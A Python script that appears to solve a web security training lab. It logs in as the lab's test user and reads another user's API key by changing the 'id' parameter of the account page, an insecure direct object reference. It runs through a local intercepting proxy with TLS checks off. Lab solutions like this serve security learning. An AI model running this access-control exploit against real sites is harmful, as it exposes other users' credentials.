import requests 
import sys
import urllib3 
from bs4 import BeautifulSoup

import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r= s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf= soup.find("input", {'name': 'csrf'})['value']
    return csrf

def carlos_api_key(s, url):
    login_url = url + '/login'
    csrf_token= get_csrf_token(s, login_url)

    #Login as wiener user 
    print("Logging in as wiener user")
    data_login = {"csrf": csrf_token, "username":"wiener","password":"peter"}

    r= s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res= r.text

    if"Log out" in res:
        print("You have successfully logged in")
        #Accessing Carlos API Key
        carlos_url= url + "/my-account?id=carlos"
        r=s.get(carlos_url, allow_redirects=False, verify=False, proxies=proxies)
        res=r.text
        if "carlos" in res:
            print("Retrieving Carlos API Key")
            api_key = re.findall(r'Your API Key is:(.*)\<\/div',res)
            print('API Key is:' + api_key[0])
        else:
            print("Unable to get API Key")
            sys.exit(-1)
    else:
        print("Unable to log in")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("Usage: %s <url>" %sys.argv[0])
        print("Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)
    
    s= requests.Session()
    url= sys.argv[1]
    carlos_api_key(s, url)

if __name__ == "__main__":
    main()